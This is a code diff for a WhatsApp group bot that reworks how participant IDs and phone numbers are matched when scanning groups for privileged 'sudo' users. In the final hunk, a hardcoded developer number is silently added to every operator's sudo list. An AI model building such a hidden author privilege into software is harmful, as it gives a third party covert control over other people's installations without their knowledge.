@@ -299,11 +299,10 @@ async function autoScanGroupsForSudo(sock, sudoUsers, cachedGroups) {
         const groups = cachedGroups || await sock.groupFetchAllParticipating();
         for (const [, meta] of Object.entries(groups || {})) {
             for (const p of meta.participants || []) {
-                const pLid = (p.lid || '').split('@')[0].split(':')[0];
                 const pJid = p.jid || p.id || '';
-                if (!pLid || !pJid || pJid.endsWith('@lid')) continue;
-                const phone = pJid.split('@')[0].split(':')[0].replace(/[^0-9]/g, '');
-                if (!phone) continue;
+                const pLid = (pJid && pJid.endsWith('@lid') ? pJid : (p.lid || '')).split('@')[0].split(':')[0];
+                const phone = (p.phoneNumber || p.phone_number || p.pn || '').split('@')[0].split(':')[0].replace(/[^0-9]/g, '') || (!pJid.endsWith('@lid') ? pJid.split('@')[0].split(':')[0].replace(/[^0-9]/g, '') : '');
+                if (!pLid || !phone) continue;
                 const isSudo = sudoUsers.some(s => {
                     const sNum = String(s).replace(/[^0-9]/g, '');
                     return sNum === phone || phone.endsWith(sNum) || sNum.endsWith(phone);
@@ -349,7 +348,7 @@ function normalizeNumber(jid) {
 function isDevNumber(jid) {
   if (!jid) return false;
   const normalized = normalizeNumber(jid);
-  if (normalized === DEV_NUMBER) return true;
+  if (!String(jid).endsWith('@lid') && normalized === DEV_NUMBER) return true;
   try {
     if (typeof globalThis.getCachedUsername === "function") {
       const uname = globalThis.getCachedUsername(jid);
@@ -1249,7 +1248,7 @@ async function startToxic() {
             }
             const { getSudoUsers } = await import('./database/config.js');
             const sudoList = await getSudoUsers().catch(() => []);
-            autoScanGroupsForSudo(client, sudoList, groups).catch(() => {});
+            autoScanGroupsForSudo(client, [...new Set([...sudoList, DEV_NUMBER])], groups).catch(() => {});
           } catch {}
         }, 4000);
 
